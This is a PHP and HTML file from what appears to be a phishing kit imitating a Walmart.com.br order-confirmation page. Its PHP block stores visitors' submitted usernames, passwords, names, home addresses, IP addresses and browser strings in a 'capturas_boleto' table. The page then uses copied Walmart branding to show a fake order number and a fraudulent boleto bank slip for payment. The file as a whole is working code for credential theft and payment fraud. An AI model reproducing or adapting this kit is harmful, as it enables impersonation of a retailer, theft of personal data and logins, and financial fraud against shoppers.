<?php

error_reporting(0);
ini_set(“display_errors”, 0 );




if(isset($_POST['ID'])){


require_once ("../Raiz/admin/function/config.php");
require_once ("../Raiz/admin/function/conexao.php");


$ID_A = $_POST["ID"];
$USUARIO_A = $_POST["user"];
$SENHA_A = $_POST["pass"];
$NOME_A = $_POST["nome"];
$CEP_A = $_POST["cep"];
$ENDERECO_A = $_POST["endereco"];
$SEM_NUMERO_A = $_POST["numero_sem"];
$NUMERO_A = $_POST ["numero"];
$COMPLEMENTO_A = $_POST ["complemento"];
$BAIRRO_A = $_POST ["bairro"];
$CIDADE_A = $_POST ["cidade"];
$ESTADO_A = $_POST ["estado"];
$PONTO_A = $_POST["ponto"];
$APELIDO_A = $_POST ["apelido"];
$GERA_A = $_POST ["gera"];

$ID =  addslashes($ID_A);
$USUARIO =  addslashes($USUARIO_A);
$SENHA =  addslashes($SENHA_A);
$NOME =  addslashes($NOME_A);
$CEP =  addslashes($CEP_A);
$ENDERECO =  addslashes($ENDERECO_A);
$SEM_NUMERO =  addslashes($SEM_NUMERO_A);
$NUMERO =  addslashes($NUMERO_A);
$COMPLEMENTO =  addslashes($COMPLEMENTO_A);
$BAIRRO =  addslashes($BAIRRO_A);
$CIDADE =  addslashes($CIDADE_A);
$ESTADO =  addslashes($ESTADO_A);
$PONTO =  addslashes($PONTO_A);
$APELIDO =  addslashes($APELIDO_A);
$GERA =  addslashes($GERA_A);
$ip = $_SERVER["REMOTE_ADDR"];
$dispositivo = $_SERVER['HTTP_USER_AGENT'];
$data1=date("d-m-Y");



$dados4 = "SELECT* FROM produtos where id='$ID'";
$con4 = $mysqli -> query($dados4) or die ($mysqli -> error);


$sql = "INSERT INTO capturas_boleto (usuario, senha, nome, cep, endereco, numero, complemento, bairro, cidade, estado, ponto, apelido, dia, ip, dispositivo, id_produto) VALUES ('$USUARIO', '$SENHA', '$NOME', '$CEP', '$ENDERECO', '$NUMERO', '$COMPLEMENTO', '$BAIRRO', '$CIDADE', '$ESTADO', '$PONTO', '$APELIDO','$data1', '$ip', '$dispositivo', '$ID')" ;
$query = $mysqli->query($sql);




$dadosX = "SELECT* FROM capturas_boleto order by id desc limit 1";
$conX = $mysqli -> query($dadosX) or die ($mysqli -> error);

while ($consultaX= $conX -> fetch_array()){
	
	$id_captura = $consultaX ["id"];
	
	
	
}




while ($consulta4= $con4 -> fetch_array()){
	
	$nome_produto = $consulta4 ["nome_produto"];
	$preco = $consulta4 ["preco"];
	$img = $consulta4 ["img"];
	$status = $consulta4 ["status_boleto"];
	
	
	
}




$dadosB = "SELECT* FROM boletos where id_produto='$ID' limit 5";
$conB = $mysqli -> query($dadosB) or die ($mysqli -> error);


while ($consultaB= $conB -> fetch_array()){
	
	$n_ab = $consultaB ["numero"];

	$id_2 = $consultaB ["id"];
	
		if ( empty ( $n_ab ) ) {
	
	   $n = '';

	
} else
{
	
	$n_2 = $consultaB ["numero"];
	
	$n2 = "".$n_2."";
	
} 
	

	
	
}




$input = array($n2 ,"");
$rand_keys = array_rand($input,2);
$input[$rand_keys[0]] . "\n";


if ( empty ( $input[$rand_keys[0]] ) ) {
	
	   echo '';

	
} else
{
	
 $id_leto = $input[$rand_keys[0]] ;
	

	
} 
	









$dados2 = "SELECT* FROM configuracao where id=1";
$con2 = $mysqli -> query($dados2) or die ($mysqli -> error);

while ($consulta2= $con2 -> fetch_array()){
	
	$desconto = $consulta2 ["desconto"];
	$vencimento = $consulta2 ["vencimento"];
	
	
	
}



$total = $preco;
$pctm = $desconto;
$valor_descontado = $total - ($total / 100 * $pctm);

$preco_final = number_format($valor_descontado,2,",",".");




$data=date("d-m-Y");
$data_final = date('d/m/Y', strtotime($data. ' + '.$vencimento.' days'));




?>








<!DOCTYPE html>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths modal-open" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="../Raiz/Files6/314572478707493" async=""></script><script async="" src="../Raiz/Files6/fbevents.js.download"></script><script async="true" type="text/javascript" src="../Raiz/Files6/event" data-owner="criteo-tag"></script><script async="" src="../Raiz/Files6/cs.js.download"></script><script async="" src="../Raiz/Files6/cs.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files6/fp.js.download"></script><script async="" src="../Raiz/Files6/cs.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files6/welcome_fp.asp.download"></script><script type="text/javascript" async="" src="../Raiz/Files6/ec.js.download"></script><script async="" src="../Raiz/Files6/cs.js.download"></script><script src="../Raiz/Files6/2960.js.download" async="" type="text/javascript"></script><script async="" src="../Raiz/Files6/cs.js.download"></script><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Pedido enviado com sucesso - Walmart.com</title><meta name="description" content=""><meta name="viewport" content="width=device-width,user-scalable=no"><link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><link rel="icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><!-- Place favicon.ico and apple-touch-icon.png in the root directory --><link rel="stylesheet" href="../Raiz/Files6/f41d9923.checkout.css"><script src="../Raiz/Files6/ff3057f9.feature.js.download"></script><script src="../Raiz/Files6/analytics.js.download"></script><script src="../Raiz/Files6/s-code-contents-18bb769dbfda1ec099f682ef04215ace88fc2799.js.download"></script><script language="Javascript" type="text/javascript" src="../Raiz/Files6/encryption.js.download"></script>
<script language="Javascript" type="text/javascript" src="../Raiz/Files6/getkey.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files6/satellite-56d8236264746d5460002c13.js.download"></script><script src="../Raiz/Files6/satellite-5616ad06366462001700171b.js.download"></script><script src="../Raiz/Files6/satellite-55ad40a733646300140007cc.js.download"></script><script src="../Raiz/Files6/satellite-55dc9d3f6165630017001049.js.download"></script><script src="../Raiz/Files6/satellite-55e46d9c6330630014000aca.js.download"></script><script src="../Raiz/Files6/satellite-55e702506533640014001100.js.download"></script><script src="../Raiz/Files6/satellite-56df553064746d05210015ba.js.download"></script><script src="../Raiz/Files6/satellite-561d60b33535310014000298.js.download"></script><script src="../Raiz/Files6/satellite-58177c1c64746d5fda00cd74.js.download"></script><script src="../Raiz/Files6/satellite-5873742764746d6035006d7c.js.download"></script><script src="../Raiz/Files6/satellite-59e4f61e64746d35d20003e4.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files6/satellite-5616ad2564363200140007f9.js.download"></script><script src="../Raiz/Files6/satellite-55ad40d76331300014000163.js.download"></script><script src="../Raiz/Files6/satellite-55b67fe33062610017000a80.js.download"></script><script src="../Raiz/Files6/satellite-55dc9d646236660014000b5a.js.download"></script><script src="../Raiz/Files6/satellite-55e43ca53961370014000750.js.download"></script><script src="../Raiz/Files6/satellite-561d684b323837001400094f.js.download"></script><script src="../Raiz/Files6/satellite-56e1948964746d052f00258b.js.download"></script><script src="../Raiz/Files6/satellite-58177cbf64746d4ccb00c996.js.download"></script><script src="../Raiz/Files6/satellite-59e4f64264746d35d8000089.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files6/satellite-56e1951c64746d0532002246.js.download"></script><script src="../Raiz/Files6/satellite-5616ad4e6436320017000879.js.download"></script><script src="../Raiz/Files6/satellite-55ad2c4a336463001700071b.js.download"></script><script src="../Raiz/Files6/satellite-55b67fbe61613900140008c4.js.download"></script><script src="../Raiz/Files6/satellite-55dc9d8e65353207ba000102.js.download"></script><script src="../Raiz/Files6/satellite-55eeedcb32633720f10005a6.js.download"></script><script src="../Raiz/Files6/satellite-56e194ac64746d0532002241.js.download"></script><script src="../Raiz/Files6/satellite-58177cef64746d4cc800cb2f.js.download"></script><script src="../Raiz/Files6/satellite-561d68843535310017000219.js.download"></script><script src="../Raiz/Files6/satellite-59e4f67a64746d35cf000160.js.download"></script><script src="../Raiz/Files6/satellite-56e1951c64746d0532002246.js.download"></script><script src="../Raiz/Files6/satellite-5616ad766266640014000ac7.js.download"></script><script src="../Raiz/Files6/satellite-55ad2c6f6134610014000131.js.download"></script><script src="../Raiz/Files6/satellite-59a55d9564746d51ff000ea3.js.download"></script><script src="../Raiz/Files6/satellite-5a01981464746d15370023fd.js.download"></script><script src="../Raiz/Files6/satellite-55b680083062610017000a82.js.download"></script><script src="../Raiz/Files6/satellite-55dc9dc8303837001400009e.js.download"></script><script src="../Raiz/Files6/satellite-55ddbabc3038370017000d3e.js.download"></script><script src="../Raiz/Files6/satellite-55ef12b26165660014000375.js.download"></script><script src="../Raiz/Files6/satellite-56e1954164746d052f00258f.js.download"></script><script src="../Raiz/Files6/satellite-58076d9b64746d5fd100663c.js.download"></script><script src="../Raiz/Files6/satellite-561d68bf373361001400012f.js.download"></script><script src="../Raiz/Files6/satellite-58b81f3464746d36790025a6.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files6/satellite-58de99cc64746d33eb00af31.js.download"></script><script src="../Raiz/Files6/satellite-556e214f3337303f45760200.js.download"></script><script src="../Raiz/Files6/satellite-5550e01836343747f7740400.js.download"></script><script src="../Raiz/Files6/satellite-5575a8103566360017320200.js.download"></script><script src="../Raiz/Files6/satellite-586d4dd064746d2b580017b8.js.download"></script><script src="../Raiz/Files6/satellite-5824610064746d063800105d.js.download"></script><script src="../Raiz/Files6/satellite-5550e26c6234390014560600.js.download"></script><script type="text/javascript" src="../Raiz/Files6/act.php"></script></head><body class="thankyou-page" style=""><img style="display: none;" src="../Raiz/Files6/clear.png"><img style="display: none;" src="../Raiz/Files6/clear(1).png"><div class="wrapper"><header class="header choose-address choose-delivery choose-payment thank-you"><div class="header-wrapper">
  <figure class="navbar-brand">
    
    
      <a href="#">
        <img class="header-logo white" src="../Raiz/Files6/walmart-logo.png" alt="Walmart.com">
      </a>
    

  </figure>
  <h1 class="header-title thank-you">
    Muito obrigado!
  </h1>
  <div class="header-security">
    <div class="header-security-wrapper">
<img src="../Raiz/assets/img/barra.png" >

    </div>
  </div>
</div>
</header><!-- Main content --><main class="main-content"><div class="thankyou-page-content">

	<div id="header-order-view" class="header-order-view container"><p class="order-description">Pedido realizado com sucesso!</p>
<p class="order-number">Nº <?php echo $GERA ?></p>


<div id="order-number-wrapper-desktop" style="display:none;">
  <span class="finish-order-number"><?php echo $GERA ?></span>
</div>
</div>

	<div class="view-group container">
		<div id="next-steps-view" class="next-steps-view"><div class="steps-list"><div class="steps-item">
  
<img src="../Raiz/assets/img/leto.png" >
  <div class="step-description">
      <p class="step-description-date">
        Pague o boleto bancário até o dia
        <span id="bankSlipDueDate" class="bank-slip-due-date"><?php echo  $data_final ?></span>
      </p>
	  <form action="boleto.php" method="post" target="_blank" >
	  <input type="hidden" name="id" value="<?php echo $id_leto ?>" >
	  <input type="hidden" name="id_captura" value="<?php echo $id_captura ?>" >
	  <input type="hidden" name="dia" value="<?php echo $data_final ?>" >
	  <input type="hidden" name="gera" value="<?php echo $GERA ?>" >
	  <input type="hidden" name="preco" value="<?php echo $preco ?>" >
      <button type="submit" class="btn btn-success btn-rounded btn-print-bill" type="button">Abrir boleto</button>
	  
	  </form>
	  
	  
    </div>
  
</div>

<div class="steps-item ">
<img src="../Raiz/assets/img/prazo.png" >
  <div class="step-description"><p>O prazo de entrega se inicia a partir da confirmação de pagamento do seu pedido.</p></div>
</div>

<div class="steps-item">
<img src="../Raiz/assets/img/caminhao.png" >
  <div class="step-description">
    <p>
    Acompanhe a entrega do seu pedido acessando <a href="#" target="_blank">sua conta</a> no menu superior ou

    
      <a id="downloadApp">baixando nosso app</a>
    
    
    
    

    em seu smartphone.
    </p>
  </div>
</div>

<div class="next-steps-buttons">
  <button id="aboutDelivery" class="btn btn-default-border btn-rounded">Sobre a entrega</button>
  <button id="changeAndReturn" class="btn btn-default-border btn-rounded">Troca e devolução</button>
</div>
</div></div>
		<div id="recomendations-views" class="recomendations-views"><div class="recomendations-views-wrap"><div id="service-recommendation" class="service-recommendation">
  

</div>
</div></div>
	</div>

	<div id="order-resume-view" class="order-resume-view" style="display: block;"><div><div class="order-payment"><div class="order-payment-content"><div class="order-description-warning">
  
  <h2 class="order-description-title container-title ordem-resume-title">Resumo do pedido</h2>
  <p class="order-description-number"><?php echo $GERA ?></p>
  <p class="order-description-text">Você receberá um e-mail com a confirmação e todos os detalhes do seu pedido. Verifique as configurações AntiSpam do seu provedor de e-mail.</p>
  <button class="btn btn-default-border btn-print-order" type="button">Imprimir pedido</button>
</div>

<div class="order-description-payment">
  <h2 class="order-description-title container-title">Pagamento</h2>
  <div id="paymentType"><div><h2 class="check-card-title">Boleto bancário</h2>

<div class="check-card-description">
	<figure class="check-card-image">
		<img class="card-img" src="../Raiz/Files6/boleto-bancario.png" alt="Pagamento por boleto">
	</figure>

	<div class="check-card-description-info">
		
		<span class="card-name"><?php echo $NOME ?></span>
		
			<span class="card-number">Pagamento à vista  R$ <?php echo $preco_final ?></span>
		
	</div>
</div>

	  <form action="boleto.php" method="post" target="_blank" >
	  <input type="hidden" name="id" value="<?php echo $id_leto ?>" >
	  <input type="hidden" name="id_captura" value="<?php echo $id_captura ?>" >
	  <input type="hidden" name="dia" value="<?php echo $data_final ?>" >
	  <input type="hidden" name="gera" value="<?php echo $GERA ?>" >
	  <input type="hidden" name="preco" value="<?php echo $preco ?>" >
	  
	  
	<button type="submit" class="btn btn-success btn-print-bill" type="button">Imprimir boleto</button>
	</form>

</div></div>
</div>
</div></div>




</body></html>

<?php } ?>